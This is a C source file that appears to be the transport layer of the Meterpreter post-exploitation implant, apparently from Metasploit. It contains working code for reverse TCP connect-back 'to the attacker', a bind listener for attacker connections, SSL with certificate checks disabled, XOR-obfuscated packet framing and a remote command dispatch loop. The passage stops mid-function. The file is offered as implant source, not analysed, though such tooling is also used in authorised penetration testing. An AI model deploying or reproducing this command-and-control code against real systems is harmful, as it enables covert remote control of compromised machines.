/*!
 * @file server_setup.c
 */
#include "metsrv.h"
#include "../../common/common.h"
#include <netdb.h>
#include <netinet/in.h>

const unsigned int hAppInstance = 0x504b5320;	// 'PKS '

/*! @brief An array of locks for use by OpenSSL. */
static LOCK **ssl_locks = NULL;

/*!
 * @brief Perform the reverse_tcp connect.
 * @param reverseSocket The existing socket that refers to the remote host connection, closed on failure.
 * @param sockAddr The SOCKADDR structure which contains details of the connection.
 * @param sockAddrSize The size of the \c sockAddr structure.
 * @param retryTotal The number of seconds to continually retry for.
 * @param retryWait The number of seconds between each connect attempt.
 * @return Indication of success or failure.
 */
static DWORD reverse_tcp_run(SOCKET reverseSocket, struct sockaddr* sockAddr, int sockAddrSize, DWORD retryTotal, DWORD retryWait)
{
	DWORD result = ERROR_SUCCESS;
	int start = current_unix_timestamp();
	do {
		int retryStart = current_unix_timestamp();
		if ((result = connect(reverseSocket, sockAddr, sockAddrSize)) != SOCKET_ERROR) {
			break;
		}

		dprintf("[TCP RUN] Connection failed, sleeping for %u s", retryWait);
		sleep(retryWait * 1000);
	} while (((DWORD)current_unix_timestamp() - (DWORD)start) < retryTotal);

	if (result == SOCKET_ERROR) {
		closesocket(reverseSocket);
	}

	return result;
}

/*!
 * @brief Connects to a provided host/port (IPv4), downloads a payload and executes it.
 * @param host String containing the name or IP of the host to connect to.
 * @param port Port number to connect to.
 * @param retryTotal The number of seconds to continually retry for.
 * @param retryWait The number of seconds between each connect attempt.
 * @return Indication of success or failure.
 */
static DWORD reverse_tcp4(const char* host, u_short port, DWORD retryTotal, DWORD retryWait, SOCKET* socketBuffer)
{
	// prepare to connect to the attacker
	DWORD result = ERROR_SUCCESS;
	SOCKET socketHandle = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	struct hostent* target = gethostbyname(host);
	char* targetIp = inet_ntoa(*(struct in_addr *)*target->h_addr_list);

	struct sockaddr_in sock = { 0 };

	sock.sin_addr.s_addr = inet_addr(targetIp);
	sock.sin_family = AF_INET;
	sock.sin_port = htons(port);
	*socketBuffer = 0;

	result = reverse_tcp_run(socketHandle, (struct sockaddr*)&sock, sizeof(sock), retryTotal, retryWait);

	if (result == ERROR_SUCCESS)
	{
		*socketBuffer = socketHandle;
	}

	return result;
}


/*!
 * @brief Connects to a provided host/port (IPv6), downloads a payload and executes it.
 * @param host String containing the name or IP of the host to connect to.
 * @param service The target service/port.
 * @param scopeId IPv6 scope ID.
 * @param retryTotal The number of seconds to continually retry for.
 * @param retryWait The number of seconds between each connect attempt.
 * @return Indication of success or failure.
 */
static DWORD reverse_tcp6(const char* host, const char* service, ULONG scopeId, DWORD retryTotal, DWORD retryWait, SOCKET* socketBuffer)
{
	int start;
	DWORD result = ERROR_SUCCESS;
	SOCKET socketHandle;
	struct addrinfo hints = { 0 };

	*socketBuffer = 0;

	hints.ai_family = AF_INET6;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	struct addrinfo* addresses;
	if (getaddrinfo(host, service, &hints, &addresses) != 0)
	{
		return errno;
	}

	// prepare to connect to the attacker
	socketHandle = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);

	if (socketHandle == INVALID_SOCKET)
	{
		dprintf("[STAGELESS IPV6] failed to connect to attacker");
		return errno;
	}

	start = current_unix_timestamp();
	do
	{
		struct addrinfo* address = NULL;
		int retryStart = current_unix_timestamp();
		for (address = addresses; address != NULL; address = address->ai_next)
		{
			((struct sockaddr_in6*)address->ai_addr)->sin6_scope_id = scopeId;

			if (connect(socketHandle, address->ai_addr, (int)address->ai_addrlen) != SOCKET_ERROR)
			{
				dprintf("[STAGELESS IPV6] Socket successfully connected");
				*socketBuffer = socketHandle;
				freeaddrinfo(addresses);
				return ERROR_SUCCESS;
			}
		}

		dprintf("[TCP RUN] Connection failed, sleeping for %u s", retryWait);
		sleep(retryWait);
	} while (((DWORD)current_unix_timestamp() - (DWORD)start) < retryTotal);

	closesocket(socketHandle);
	freeaddrinfo(addresses);

	return errno;
}

/*!
 * @brief Perform the bind_tcp process.
 * @param listenSocket The existing listen socket that refers to the remote host connection, closed before returning.
 * @param sockAddr The SOCKADDR structure which contains details of the connection.
 * @param sockAddrSize The size of the \c sockAddr structure.
 * @param acceptSocketBuffer Buffer that will receive the accepted socket handle on success.
 * @return Indication of success or failure.
 */
static DWORD bind_tcp_run(SOCKET listenSocket, struct sockaddr* sockAddr, int sockAddrSize, SOCKET* acceptSocketBuffer)
{
	SOCKET acceptSocket;
	DWORD result = ERROR_SUCCESS;

	do
	{
		int yes = 1;
		if (setsockopt(listenSocket, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes)) != 0)
		{
			dprintf("[BIND RUN] Failed to set sock opt: %u", errno);
			result = errno;
			break;
		}

		if (bind(listenSocket, sockAddr, sockAddrSize) == SOCKET_ERROR)
		{
			dprintf("[BIND RUN] Socket failed to bind: %u", errno);
			result = errno;
			break;
		}

		dprintf("[BIND RUN] Socket bound successfully");

		if (listen(listenSocket, 1) == SOCKET_ERROR)
		{
			result = errno;
			break;
		}

		dprintf("[BIND RUN] Listening ...");

		// Setup, ready to go, now wait for the connection.
		acceptSocket = accept(listenSocket, NULL, NULL);

		if (acceptSocket == INVALID_SOCKET)
		{
			result = errno;
			break;
		}

		dprintf("[BIND RUN] Valid socket accepted %u", acceptSocket);

		*acceptSocketBuffer = acceptSocket;
	} while (0);

	closesocket(listenSocket);

	return result;
}

/*!
 * @brief Listens on a port for an incoming payload request.
 * @param port Port number to listen on.
 */
static DWORD bind_tcp(u_short port, SOCKET* socketBuffer)
{
	*socketBuffer = 0;

	// prepare a connection listener for the attacker to connect to, and we
	// attempt to bind to both ipv6 and ipv4 by default, and fallback to ipv4
	// only if the process fails.
	BOOL v4Fallback = FALSE;
	SOCKET listenSocket = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);

	if (listenSocket == INVALID_SOCKET)
	{
		dprintf("[BIND] Unable to create IPv6 socket");
		v4Fallback = TRUE;
	}
	else
	{
		int no = 0;
		if (setsockopt(listenSocket, IPPROTO_IPV6, IPV6_V6ONLY, (char*)&no, sizeof(no)) == SOCKET_ERROR)
		{
			// fallback to ipv4 - we're probably running on Windows XP or earlier here, which means that to
			// support IPv4 and IPv6 we'd need to create two separate sockets. IPv6 on XP isn't that common
			// so instead, we'll just revert back to v4 and listen on that one address instead.
			dprintf("[BIND] Unable to remove IPV6_ONLY option");
			closesocket(listenSocket);
			v4Fallback = TRUE;
		}
	}

	if (v4Fallback)
	{
		dprintf("[BIND] Falling back to IPV4");
		listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	}

	struct sockaddr_in6 sockAddr = { 0 };

	if (v4Fallback)
	{
		struct sockaddr_in* v4Addr = (struct sockaddr_in*)&sockAddr;
		v4Addr->sin_addr.s_addr = htons(INADDR_ANY);
		v4Addr->sin_family = AF_INET;
		v4Addr->sin_port = htons(port);
	}
	else
	{
		sockAddr.sin6_addr = in6addr_any;
		sockAddr.sin6_family = AF_INET6;
		sockAddr.sin6_port = htons(port);
	}

	return bind_tcp_run(listenSocket, (struct sockaddr*)&sockAddr, v4Fallback ? sizeof(struct sockaddr_in) : sizeof(struct sockaddr_in6), socketBuffer);
}


/*!
 * @brief A callback function used by OpenSSL to leverage native system locks.
 * @param mode The lock mode to set.
 * @param type The lock type to operate on.
 * @param file Unused.
 * @param line Unused.
 */
static void server_locking_callback(int mode, int type, const char *file, int line)
{
	if (mode & CRYPTO_LOCK) {
		lock_acquire(ssl_locks[type]);
	} else {
		lock_release(ssl_locks[type]);
	}
}

/*!
 * @brief A callback function used by OpenSSL to get the current threads id.
 * @returns The current thread ID.
 * @remarks While not needed on windows this must be used for posix meterpreter.
 */
static long unsigned int server_threadid_callback(void)
{
	return pthread_self();
}

/*!
 * @brief A callback function for dynamic lock creation for OpenSSL.
 * @returns A pointer to a lock that can be used for synchronisation.
 * @param file _Ignored_
 * @param line _Ignored_
 */
static struct CRYPTO_dynlock_value *server_dynamiclock_create(const char *file, int line)
{
	return (struct CRYPTO_dynlock_value *)lock_create();
}

/*!
 * @brief A callback function for dynamic lock locking for OpenSSL.
 * @param mode A bitmask which indicates the lock mode.
 * @param l A point to the lock instance.
 * @param file _Ignored_
 * @param line _Ignored_
 */
static void server_dynamiclock_lock(int mode, struct CRYPTO_dynlock_value *l, const char *file,
	int line)
{
	LOCK *lock = (LOCK *) l;
	if (mode & CRYPTO_LOCK) {
		lock_acquire(lock);
	} else {
		lock_release(lock);
	}
}

/*!
 * @brief A callback function for dynamic lock destruction for OpenSSL.
 * @param l A point to the lock instance.
 * @param file _Ignored_
 * @param line _Ignored_
 */
static void server_dynamiclock_destroy(struct CRYPTO_dynlock_value *l, const char *file, int line)
{
	lock_destroy((LOCK *) l);
}

/*!
 * @brief Flush all pending data on the connected socket before doing SSL.
 * @param remote Pointer to the remote instance.
 */
static VOID server_socket_flush(Transport* transport)
{
	TcpTransportContext* ctx = (TcpTransportContext*)transport->ctx;
	fd_set fdread;
	DWORD ret;
	char buff[4096];

	lock_acquire(transport->lock);

	while (1) {
		struct timeval tv;
		LONG data;

		FD_ZERO(&fdread);
		FD_SET(ctx->fd, &fdread);

		// Wait for up to one second for any errant socket data to appear
		tv.tv_sec = 1;
		tv.tv_usec = 0;

		data = select((int)ctx->fd + 1, &fdread, NULL, NULL, &tv);
		if (data == 0) {
			break;
		}

		ret = recv(ctx->fd, buff, sizeof(buff), 0);
		dprintf("[SERVER] Flushed %d bytes from the buffer", ret);

		// The socket closed while we waited
		if (ret <= 0) {
			break;
		}
		continue;
	}

	lock_release(transport->lock);
}

/*!
 * @brief Poll a socket for data to recv and block when none available.
 * @param remote Pointer to the remote instance.
 * @param timeout Amount of time to wait before the poll times out (in milliseconds).
 * @return Indication of success or failure.
 */
static LONG server_socket_poll(Remote * remote, long timeout) {
	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
	struct timeval tv;
	LONG result;
	fd_set fdread;

	lock_acquire(remote->lock);
	FD_ZERO(&fdread);
	FD_SET(ctx->fd, &fdread);
	tv.tv_sec = 0;
	tv.tv_usec = timeout;
	result = select((int)ctx->fd + 1, &fdread, NULL, NULL, &tv);

	if (result == -1 && (errno == EINTR || errno == EAGAIN || errno == EWOULDBLOCK)) {
		result = 0;
	}

	lock_release(remote->lock);
	return result;
}

/*!
 * @brief Initialize the OpenSSL subsystem for use in a multi threaded enviroment.
 * @param transport Pointer to the transport instance.
 * @return Indication of success or failure.
 */
static BOOL server_initialize_ssl(Transport* transport) {
	int i;

	lock_acquire(transport->lock);

	// Begin to bring up the OpenSSL subsystem...
	CRYPTO_malloc_init();
	SSL_load_error_strings();
	SSL_library_init();

	// Setup the required OpenSSL multi-threaded enviroment...
	ssl_locks = malloc(CRYPTO_num_locks() * sizeof(LOCK *));
	if (ssl_locks == NULL) {
			dprintf("[SSL INIT] failed to allocate locks (%d locks)", CRYPTO_num_locks());
		lock_release(transport->lock);
		return FALSE;
	}

	for (i = 0; i < CRYPTO_num_locks(); i++) {
		ssl_locks[i] = lock_create();
	}

	CRYPTO_set_id_callback(server_threadid_callback);
	CRYPTO_set_locking_callback(server_locking_callback);
	CRYPTO_set_dynlock_create_callback(server_dynamiclock_create);
	CRYPTO_set_dynlock_lock_callback(server_dynamiclock_lock);
	CRYPTO_set_dynlock_destroy_callback(server_dynamiclock_destroy);
	lock_release(transport->lock);

	return TRUE;
}

/*!
 * @brief Bring down the OpenSSL subsystem
 * @param transport Pointer to the transport instance.
 * @return Indication of success or failure.
 */
static BOOL server_destroy_ssl(Transport* transport) {
	TcpTransportContext* ctx = NULL;
	int i;

	if (transport) {
		dprintf("[SERVER] Destroying SSL");
		lock_acquire(transport->lock);
		if (transport && transport->ctx) {
			ctx = (TcpTransportContext*)transport->ctx;
			SSL_free(ctx->ssl);
			SSL_CTX_free(ctx->ctx);
		}
		CRYPTO_set_locking_callback(NULL);
		CRYPTO_set_id_callback(NULL);
		CRYPTO_set_dynlock_create_callback(NULL);
		CRYPTO_set_dynlock_lock_callback(NULL);
		CRYPTO_set_dynlock_destroy_callback(NULL);

		for (i = 0; i < CRYPTO_num_locks(); i++) {
			lock_destroy(ssl_locks[i]);
		}

		free(ssl_locks);
		lock_release(transport->lock);
	}

	return TRUE;
}

/*!
 * @brief Negotiate SSL on the socket.
 * @param transport Pointer to the transport instance.
 * @return Indication of success or failure.
 */
static BOOL server_negotiate_ssl(Transport* transport) {
	TcpTransportContext* ctx = (TcpTransportContext*)transport->ctx;
	BOOL success = TRUE;
	DWORD ret = 0;
	DWORD res = 0;
	lock_acquire(transport->lock);

	ctx->meth = (SSL_METHOD*)TLSv1_client_method();
	ctx->ctx = SSL_CTX_new(ctx->meth);
	SSL_CTX_set_mode(ctx->ctx, SSL_MODE_AUTO_RETRY);
	ctx->ssl = SSL_new(ctx->ctx);
	SSL_set_verify(ctx->ssl, SSL_VERIFY_NONE, NULL);
	if (SSL_set_fd(ctx->ssl, ctx->fd) == 0) {
		dprintf("[SERVER] set fd failed");
		success = FALSE;
		goto out;
	}

	do {
		if ((ret = SSL_connect(ctx->ssl)) != 1) {
			res = SSL_get_error(ctx->ssl, ret);
			dprintf("[SERVER] connect failed %d\n", res);
			if (res == SSL_ERROR_WANT_READ || res == SSL_ERROR_WANT_WRITE) {

				// Catch non-blocking socket errors and retry
				continue;
			}
			success = FALSE;
			break;
		}
	} while (ret != 1);

	if (success == FALSE)
		goto out;

	dprintf("[SERVER] Sending a HTTP GET request to the remote side...");
	if ((ret = SSL_write(ctx->ssl, "GET /123456789 HTTP/1.0\r\n\r\n", 27)) <= 0) {
		dprintf("[SERVER] SSL write failed during negotiation with return: %d (%d)", ret,
			SSL_get_error(ctx->ssl, ret));
	}

out:
	lock_release(transport->lock);
	dprintf("[SERVER] Completed writing the HTTP GET request: %d", ret);
	if (ret < 0) {
		success = FALSE;
	}
	return success;
}

/*!
 * @brief Transmit a packet via SSL _and_ destroy it.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the \c Packet that is to be sent.
 * @param completion Pointer to the completion routines to process.
 * @return An indication of the result of processing the transmission request.
 * @remark This uses an SSL-encrypted TCP channel, and does not imply the use of HTTPS.
 */
DWORD packet_transmit_via_ssl(Remote* remote, Packet* packet, PacketRequestCompletion* completion)
{
	CryptoContext* crypto;
	Tlv requestId;
	DWORD res;
	DWORD idx;
	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;

	lock_acquire(remote->lock);

	// If the packet does not already have a request identifier, create one for it
	if (packet_get_tlv_string(packet, TLV_TYPE_REQUEST_ID, &requestId) != ERROR_SUCCESS)
	{
		DWORD index;
		CHAR rid[32];

		rid[sizeof(rid)-1] = 0;

		for (index = 0; index < sizeof(rid)-1; index++)
		{
			rid[index] = (rand() % 0x5e) + 0x21;
		}

		packet_add_tlv_string(packet, TLV_TYPE_REQUEST_ID, rid);
	}

	do
	{
		// If a completion routine was supplied and the packet has a request
		// identifier, insert the completion routine into the list
		if ((completion) &&
			(packet_get_tlv_string(packet, TLV_TYPE_REQUEST_ID,
			&requestId) == ERROR_SUCCESS))
		{
			packet_add_completion_handler((LPCSTR)requestId.buffer, completion);
		}

		// If the endpoint has a cipher established and this is not a plaintext
		// packet, we encrypt
		if ((crypto = remote_get_cipher(remote)) &&
			(packet_get_type(packet) != PACKET_TLV_TYPE_PLAIN_REQUEST) &&
			(packet_get_type(packet) != PACKET_TLV_TYPE_PLAIN_RESPONSE))
		{
			ULONG origPayloadLength = packet->payloadLength;
			PUCHAR origPayload = packet->payload;

			// Encrypt
			if ((res = crypto->handlers.encrypt(crypto, packet->payload,
				packet->payloadLength, &packet->payload,
				&packet->payloadLength)) !=
				ERROR_SUCCESS)
			{
				SetLastError(res);
				break;
			}

			// Destroy the original payload as we no longer need it
			free(origPayload);

			// Update the header length
			packet->header.length = htonl(packet->payloadLength + sizeof(TlvHeader));
		}

		dprintf("[PACKET] New xor key for sending");
		packet->header.xor_key = rand_xor_key();
		// before transmission, xor the whole lot, starting with the body
		xor_bytes(packet->header.xor_key, (LPBYTE)packet->payload, packet->payloadLength);
		// then the header
		xor_bytes(packet->header.xor_key, (LPBYTE)&packet->header.length, 8);
		// be sure to switch the xor header before writing
		packet->header.xor_key = htonl(packet->header.xor_key);

		idx = 0;
		while (idx < sizeof(packet->header))
		{
			// Transmit the packet's header (length, type)
			res = SSL_write(
				ctx->ssl,
				(LPCSTR)(&packet->header) + idx,
				sizeof(packet->header) - idx
				);

			if (res <= 0)
			{
				dprintf("[PACKET] transmit header failed with return %d at index %d\n", res, idx);
				break;
			}
			idx += res;
		}

		if (res < 0)
		{
			break;
		}

		idx = 0;
		while (idx < packet->payloadLength)
		{
			// Transmit the packet's payload (length, type)
			res = SSL_write(
				ctx->ssl,
				packet->payload + idx,
				packet->payloadLength - idx
				);

			if (res < 0)
			{
				break;
			}

			idx += res;
		}

		if (res < 0)
		{
			dprintf("[PACKET] transmit header failed with return %d at index %d\n", res, idx);
			break;
		}

		SetLastError(ERROR_SUCCESS);
	} while (0);

	res = GetLastError();

	// Destroy the packet
	packet_destroy(packet);

	lock_release(remote->lock);

	return res;
}

/*!
 * @brief Receive a new packet on the given remote endpoint.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to a pointer that will receive the \c Packet data.
 * @return An indication of the result of processing the transmission request.
 */
static DWORD packet_receive_via_ssl(Remote *remote, Packet **packet)
{
	DWORD headerBytes = 0, payloadBytesLeft = 0, res;
	CryptoContext *crypto = NULL;
	Packet *localPacket = NULL;
	PacketHeader header;
	LONG bytesRead;
	BOOL inHeader = TRUE;
	PUCHAR payload = NULL;
	ULONG payloadLength;
	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;

	lock_acquire(remote->lock);

	do
	{
		// Read the packet length
		while (inHeader)
		{
			if ((bytesRead = SSL_read(ctx->ssl, ((PUCHAR)&header + headerBytes), sizeof(PacketHeader)-headerBytes)) <= 0)
			{
				if (!bytesRead)
				{
					SetLastError(ERROR_NOT_FOUND);
				}

				if (bytesRead < 0)
				{
					dprintf("[PACKET] receive header failed with error code %d. SSLerror=%d, WSALastError=%d\n", bytesRead, SSL_get_error(ctx->ssl, bytesRead), WSAGetLastError());
					SetLastError(ERROR_NOT_FOUND);
				}

				break;
			}

			headerBytes += bytesRead;

			if (headerBytes != sizeof(PacketHeader))
			{
				continue;
			}

			inHeader = FALSE;
		}

		if (headerBytes != sizeof(PacketHeader))
		{
			break;
		}

		header.xor_key = ntohl(header.xor_key);

		// xor the header data
		xor_bytes(header.xor_key, &header.length, 8);

		// Initialize the header
		header.length = ntohl(header.length);

		// use TlvHeader size here, because the length doesn't include the xor byte
		payloadLength = header.length - sizeof(TlvHeader);
		payloadBytesLeft = payloadLength;

		// Allocate the payload
		if (!(payload = (PUCHAR)malloc(payloadLength)))
		{
			SetLastError(ERROR_NOT_ENOUGH_MEMORY);
			break;
		}

		// Read the payload
		while (payloadBytesLeft > 0)
		{
			if ((bytesRead = SSL_read(ctx->ssl, payload + payloadLength - payloadBytesLeft, payloadBytesLeft)) <= 0)
			{

				if (GetLastError() == WSAEWOULDBLOCK)
				{
					continue;
				}

				if (!bytesRead)
				{
					SetLastError(ERROR_NOT_FOUND);
				}

				if (bytesRead < 0)
				{
					dprintf("[PACKET] receive payload of length %d failed with error code %d. SSLerror=%d\n", payloadLength, bytesRead, SSL_get_error(ctx->ssl, bytesRead));
					SetLastError(ERROR_NOT_FOUND);
				}

				break;
			}

			payloadBytesLeft -= bytesRead;
		}

		// Didn't finish?
		if (payloadBytesLeft)
		{
			break;
		}

		xor_bytes(header.xor_key, payload, payloadLength);

		// Allocate a packet structure
		if (!(localPacket = (Packet *)malloc(sizeof(Packet))))
		{
			SetLastError(ERROR_NOT_ENOUGH_MEMORY);
			break;
		}

		memset(localPacket, 0, sizeof(Packet));

		// If the connection has an established cipher and this packet is not
		// plaintext, decrypt
		if ((crypto = remote_get_cipher(remote)) &&
			(packet_get_type(localPacket) != PACKET_TLV_TYPE_PLAIN_REQUEST) &&
			(packet_get_type(localPacket) != PACKET_TLV_TYPE_PLAIN_RESPONSE))
		{
			ULONG origPayloadLength = payloadLength;
			PUCHAR origPayload = payload;

			// Decrypt
			if ((res = crypto->handlers.decrypt(crypto, payload, payloadLength, &payload, &payloadLength)) != ERROR_SUCCESS)
			{
				SetLastError(res);
				break;
			}

			// We no longer need the encrypted payload
			free(origPayload);
		}

		localPacket->header.length = header.length;
		localPacket->header.type = header.type;
		localPacket->payload = payload;
		localPacket->payloadLength = payloadLength;

		*packet = localPacket;

		SetLastError(ERROR_SUCCESS);

	} while (0);

	res = GetLastError();

	// Cleanup on failure
	if (res != ERROR_SUCCESS)
	{
		if (payload)
		{
			free(payload);
		}
		if (localPacket)
		{
			free(localPacket);
		}
	}

	lock_release(remote->lock);

	return res;
}

/*!
 * @brief The servers main dispatch loop for incoming requests using SSL over TCP
 * @param remote Pointer to the remote endpoint for this server connection.
 * @returns Indication of success or failure.
 */
static BOOL server_dispatch_tcp(Remote * remote, THREAD* dispatchThread)
{
	BOOL running = TRUE;
	LONG result = ERROR_SUCCESS;
	Packet *packet = NULL;
	THREAD *cpt = NULL;
	dprintf("[DISPATCH] entering server_dispatch( 0x%08X )", remote);

	// Bring up the scheduler subsystem.
	result = scheduler_initialize(remote);
	if (result != ERROR_SUCCESS) {
		return result;
	}

	while (running) {
		if (event_poll(dispatchThread->sigterm, 0)) {
			dprintf("[DISPATCH] server dispatch thread signaled to terminate...");
			break;
		}
		result = server_socket_poll(remote, 500000);
		if (result > 0) {
			result = packet_receive_via_ssl(remote, &packet);
			if (result != ERROR_SUCCESS) {
				dprintf("[DISPATCH] packet_receive returned %d, exiting dispatcher...", result);
				break;
			}
			running = command_handle(remote, packet);
			dprintf("[DISPATCH] command_process result: %s", (running ? "continue" : "stop"));
		}

		else if (result < 0) {
			dprintf("[DISPATCH] server_socket_poll returned %d, exiting dispatcher...", result);
			break;
		}
	}

	dprintf("[DISPATCH] calling scheduler_destroy...")
	scheduler_destroy();

	dprintf("[DISPATCH] calling command_join_threads...")
	command_join_threads();

	dprintf("[DISPATCH] leaving server_dispatch.");
	return result;
}

/*!
 * @brief Destroy the TCP transport.
 * @param transport Pointer to the TCP transport to destroy.
 */
static void transport_destroy_tcp(Transport* transport) {
	if (transport && transport->type == METERPRETER_TRANSPORT_SSL) {
		dprintf("[TRANS TCP] Destroying tcp transport for url %S", transport->url);
		SAFE_FREE(transport->url);
		SAFE_FREE(transport->ctx);
		SAFE_FREE(transport);
	}
}

/*!
 * @brief Handle cleaning up on the client socket when MSF terminates the connection.
 * @param thread Pointer to the thread instance.
 * @return EXIT_SUCCESS
 */
DWORD THREADCALL cleanup_socket(THREAD* thread) {
	char buf[4];
	int result;
	SOCKET fd = (SOCKET)thread->parameter1;

	dprintf("[TCP] waiting for disconnect from remote");
	// loop until FD_CLOSE comes through.
	while ((result = recv(fd, buf, sizeof(buf), 0)) != 0) {
		if (result <= 0) {
			break;
		}
	}

	dprintf("[TCP] disconnect received, cleaning up");
	closesocket(fd);
	thread_destroy(thread);

	return EXIT_SUCCESS;
}

/*!
 * @brief Reset the given TCP connection.
 * @param transport Pointer to the TCP transport to reset.
 * @param shuttingDown Indication that the Metsrv instance is terminating completely.
 */
static void transport_reset_tcp(Transport* transport, BOOL shuttingDown) {
	if (transport && transport->type == METERPRETER_TRANSPORT_SSL) {
		TcpTransportContext* ctx = (TcpTransportContext*)transport->ctx;
		dprintf("[TCP] Resetting transport from %u", ctx->fd);
		if (ctx->fd) {
			if (shuttingDown) {
				dprintf("[TCP] Transport is shutting down");
				// we can terminate right here, given that we're closing up
				closesocket(ctx->fd);
			}
			else {
				dprintf("[TCP] It should now be safe to close the socket.");
				THREAD* t = thread_create(cleanup_socket, (LPVOID)ctx->fd, NULL, NULL);
				thread_run(t);
			}
		}
		ctx->fd = 0;
		dprintf("[TCP] Transport 0x%p is now reset to %u", transport, ctx->fd);
	}
}

/*!
 * @brief Configure the TCP connnection. If it doesn't exist, go ahead and estbalish it.
 * @param remote Pointer to the remote instance with the TCP transport details wired in.
 * @param sock Reference to the original socket FD passed to metsrv.
 * @return Indication of success or failure.
 */
static BOOL configure_tcp_connection(Transport* transport) {
	DWORD result = ERROR_SUCCESS;
	size_t charsConverted;
	char tempUrl[512] = {0};
	TcpTransportContext* ctx = (TcpTransportContext*)transport->ctx;

	// check if comms is already open via a staged payload
	if (ctx->fd) {
		dprintf("[TCP] Connection already running on %u", ctx->fd);
	}
	else {
		dprintf("[TCP CONFIGURE] Url: %s", transport->url);

		// copy the URL to the temp location and work from there
		// so that we don't damage the original URL while breaking
		// it up into its individual parts.
		strncpy(tempUrl, transport->url, sizeof(tempUrl) - 1);

		//transport->start_time = current_unix_timestamp();
		transport->comms_last_packet = current_unix_timestamp();

		if (strncmp(tempUrl, "tcp", 3) == 0) {
			char* pHost = strstr(tempUrl, "//") + 2;
			char* pPort = strrchr(pHost, ':') + 1;

			// check if we're using IPv6
			if (tempUrl[3] == '6') {
				char* pScopeId = strrchr(pHost, '?') + 1;
				*(pScopeId - 1) = '\0';
				*(pPort - 1) = '\0';
				dprintf("[STAGELESS] IPv6 host %s port %S scopeid %S", pHost, pPort, pScopeId);
				result = reverse_tcp6(pHost, pPort, atol(pScopeId), transport->timeouts.retry_total,
					transport->timeouts.retry_wait, &ctx->fd);
			}
			else {
				u_short usPort = (u_short)atoi(pPort);

				// if no host is specified, then we can assume that this is a bind payload, otherwise
				// we'll assume that the payload is a reverse_tcp one and the given host is valid
				if (*pHost == ':') {
					dprintf("[STAGELESS] IPv4 bind port %s", pPort);
					result = bind_tcp(usPort, &ctx->fd);
				}
				else {
					*(pPort - 1) = '\0';
					dprintf("[STAGELESS] IPv4 host %s port %s", pHost, pPort);
					result = reverse_tcp4(pHost, usPort, transport->timeouts.retry_total,
						transport->timeouts.retry_wait, &ctx->fd);
				}
			}
		}
	}

	if (result != ERROR_SUCCESS) {
		dprintf("[SERVER] Something went wrong %u", result);
		return FALSE;
	}

	dprintf("[SERVER] Looking good, FORWARD!");

	dprintf("[SERVER] Flushing the socket handle...");
	server_socket_flush(transport);

	// Short term hack to be removed when the stageless stuff works.
	// Flush the socket a second time to ignore the payload if we're
	// reconnecting
	server_socket_flush(transport);

	transport->comms_last_packet = current_unix_timestamp();

	dprintf("[SERVER] Initializing SSL...");
	if (!server_initialize_ssl(transport)) {
		return FALSE;
	}

	dprintf("[SERVER] Negotiating SSL...");
	if (!server_negotiate_ssl(transport)) {
		return FALSE;
	}

	return TRUE;
}

/*!
 * @brief Get the socket from the transport (if it's TCP).
 * @param transport Pointer to the TCP transport containing the socket.
 * @return The current transport socket FD, if any, or zero.
 */
static SOCKET transport_get_socket_tcp(Transport* transport) {
	if (transport && transport->type == METERPRETER_TRANSPORT_SSL) {
		return ((TcpTransportContext*)transport->ctx)->fd;
	}

	return 0;
}

/*!
 * @brief Creates a new TCP transport instance.
 * @param url URL containing the transport details.
 * @param timeouts The timeout values to use for this transport.
 * @return Pointer to the newly configured/created TCP transport instance.
 */
static Transport* transport_create_tcp(MetsrvTransportTcp* config) {
	Transport* transport = (Transport*)malloc(sizeof(Transport));
	TcpTransportContext* ctx = (TcpTransportContext*)malloc(sizeof(TcpTransportContext));

	dprintf("[TRANS TCP] Creating tcp transport for url %s", config->common.url);

	memset(transport, 0, sizeof(Transport));
	memset(ctx, 0, sizeof(TcpTransportContext));

	transport->type = METERPRETER_TRANSPORT_SSL;
	transport->timeouts.comms = config->common.comms_timeout;
	transport->timeouts.retry_total = config->common.retry_total;
	transport->timeouts.retry_wait = config->common.retry_wait;
	transport->url = strdup(config->common.url);
	transport->packet_transmit = packet_transmit_via_ssl;
	transport->transport_init = configure_tcp_connection;
	transport->transport_deinit = server_destroy_ssl;
	transport->transport_destroy = transport_destroy_tcp;
	transport->transport_reset = transport_reset_tcp;
	transport->server_dispatch = server_dispatch_tcp;
	transport->get_socket = transport_get_socket_tcp;
	transport->ctx = ctx;
	transport->comms_last_packet = current_unix_timestamp();

	return transport;
}

static Transport* create_transport(Remote* remote, MetsrvTransportCommon* transportCommon, LPDWORD size) {
	Transport* transport = NULL;
	dprintf("[TRNS] Transport claims to have URL: %s", transportCommon->url);
	dprintf("[TRNS] Transport claims to have comms: %d", transportCommon->comms_timeout);
	dprintf("[TRNS] Transport claims to have retry total: %d", transportCommon->retry_total);
	dprintf("[TRNS] Transport claims to have retry wait: %d", transportCommon->retry_wait);

	if (strncmp(transportCommon->url, "tcp", 3) == 0) {
		if (size) {
			*size = sizeof(MetsrvTransportTcp);
		}
		transport = transport_create_tcp((MetsrvTransportTcp*)transportCommon);
	}

	if (transport == NULL)
	{
		// something went wrong
		return NULL;
	}

	// always insert at the tail. The first transport will be the one that kicked everything off
	if (remote->transport == NULL) {
		// point to itself, as this is the first transport.
		transport->next_transport = transport->prev_transport = transport;
		remote->transport = transport;
	}
	else {
		transport->prev_transport = remote->transport->prev_transport;
		transport->next_transport = remote->transport;

		remote->transport->prev_transport->next_transport = transport;
		remote->transport->prev_transport = transport;
	}

	// share the lock with the transport
	transport->lock = remote->lock;

	return transport;
}

static void append_transport(Transport** list, Transport* newTransport) {
	if (*list == NULL) {
		// point to itself!
		newTransport->next_transport = newTransport->prev_transport = newTransport;
		*list = newTransport;
	}
	else {
		// always insert at the tail
		newTransport->prev_transport = (*list)->prev_transport;
		newTransport->next_transport = (*list);

		(*list)->prev_transport->next_transport = newTransport;
		(*list)->prev_transport = newTransport;
	}
}

static void remove_transport(Remote* remote, Transport* oldTransport) {
	// if we point to ourself, then we're the last one
